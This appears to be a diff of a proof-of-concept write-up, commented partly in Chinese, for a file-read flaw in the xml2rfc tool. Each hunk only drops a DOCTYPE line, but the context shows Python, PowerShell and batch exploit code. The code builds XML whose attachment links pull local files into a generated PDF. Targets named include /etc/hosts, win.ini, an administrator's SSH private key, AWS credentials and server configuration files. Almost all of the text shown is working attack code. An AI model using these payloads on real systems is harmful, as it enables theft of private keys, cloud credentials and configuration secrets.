@@ -203,7 +203,6 @@ import os
 
 def exploit_file_read(target_file, output_pdf="exploit.pdf"):
     xml_template = '''<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE rfc SYSTEM "rfc2629.dtd">
 <rfc version="3" ipr="trust200902" docName="draft-exploit-00" category="info">
   <link rel="attachment" href="{target}"/>
   <front>
@@ -267,7 +266,6 @@ exploit_file_read("/etc/hosts", "hosts.pdf")
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE rfc SYSTEM "rfc2629.dtd">
 <rfc version="3" ipr="trust200902" docName="draft-poc-windows-00" category="info">
   <link rel="attachment" href="C:/Windows/System32/drivers/etc/hosts"/>
   <link rel="attachment" href="C:/Windows/win.ini"/>
@@ -296,7 +294,6 @@ exploit_file_read("/etc/hosts", "hosts.pdf")
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE rfc SYSTEM "rfc2629.dtd">
 <rfc version="3" ipr="trust200902" docName="draft-poc-windows-creds-00" category="info">
   <link rel="attachment" href="C:/Users/Administrator/.ssh/id_rsa"/>
   <link rel="attachment" href="C:/Users/Administrator/.aws/credentials"/>
@@ -327,7 +324,6 @@ exploit_file_read("/etc/hosts", "hosts.pdf")
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE rfc SYSTEM "rfc2629.dtd">
 <rfc version="3" ipr="trust200902" docName="draft-poc-windows-apps-00" category="info">
   <link rel="attachment" href="C:/Program Files/Apache/conf/httpd.conf"/>
   <link rel="attachment" href="C:/xampp/phpMyAdmin/config.inc.php"/>
@@ -365,7 +361,6 @@ pip install xml2rfc==3.30.0
 # 创建恶意XML
 $xmlContent = @"
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE rfc SYSTEM "rfc2629.dtd">
 <rfc version="3" ipr="trust200902" docName="draft-exploit-00" category="info">
   <link rel="attachment" href="C:/Windows/System32/drivers/etc/hosts"/>
   <front>
@@ -430,7 +425,6 @@ REM 创建测试XML
 echo [*] 创建测试 XML 文件...
 (
 echo ^<?xml version="1.0" encoding="UTF-8"?^>
-echo ^<!DOCTYPE rfc SYSTEM "rfc2629.dtd"^>
 echo ^<rfc version="3" ipr="trust200902" docName="draft-test-00" category="info"^>
 echo   ^<link rel="attachment" href="C:/Windows/System32/drivers/etc/hosts"/^>
 echo   ^<front^>
@@ -482,7 +476,6 @@ def exploit_windows_file(target_file, output_pdf="windows_exploit.pdf"):
     Windows环境专用的文件读取POC
     """
     xml_template = '''<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE rfc SYSTEM "rfc2629.dtd">
 <rfc version="3" ipr="trust200902" docName="draft-exploit-00" category="info">
   <link rel="attachment" href="{target}"/>
   <front>
